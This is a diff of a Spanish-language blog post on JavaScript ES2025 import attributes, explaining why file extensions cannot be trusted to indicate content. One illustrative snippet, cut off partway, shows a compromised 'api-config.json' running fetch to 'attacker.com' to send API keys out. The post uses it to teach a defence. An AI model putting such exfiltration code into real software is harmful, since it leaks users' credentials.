@@ -1,10 +1,8 @@
 ---
 title: "Lo nuevo de JavaScript ES2025: Import Attributes"
-slug: js-es2025-import-attributes
 description: Comprendiendo su nueva sintaxis y por qué no podemos fiarnos solo de las extensiones de archivo.
-language: es
 date: 2024-11-22T21:33:25.684Z
-update: 2024-11-22T21:33:25.684Z
+update: 2025-01-22T21:13:59.142Z
 image:
   src: /media/2024/11/js-es2025.svg
   alt: JavaScript ES2025
@@ -32,18 +30,14 @@ JavaScript incorpora una nueva función que hace que las importaciones de módul
 
 En Internet, las extensiones de archivo no indican el contenido de forma fiable. Un servidor puede devolver JavaScript cuando usted espera JSON:
 
-😇 **main.js**
-
-```js
+```js title="main.js"
 // Parece seguro, pero podría ser peligroso ☢️
 import config from './config.json';
 ```
 
-😈 **config.json**
-
-```js
+```js title="config.json"
 // El servidor podría responder con código ejecutable:
-export default (function(){
+export default (function () {
   // Ejecución inesperada de código 💀
 })();
 ```
@@ -82,9 +76,7 @@ new Worker('processor.wasm', {
 
 El principal problema es la seguridad. En Internet, las extensiones de archivo no indican el contenido de forma fiable. Una URL que termine en `json` podría en realidad servir JavaScript:
 
-😇 **main.js**
-
-```js
+```js title="main.js"
 // Carga de la configuración de la API
 import apiConfig from './api-config.json';
 
@@ -96,11 +88,9 @@ import apiConfig from './api-config.json';
 }
 ```
 
-😈 **api-config.json**
-
-```js
+```js title="api-config.json"
 // Lo que un servidor comprometido podría enviar en su lugar:
-export default (function(){
+export default (function () {
   // Envía tus claves API a un atacante
   fetch('https://attacker.com', {
     method: 'POST',
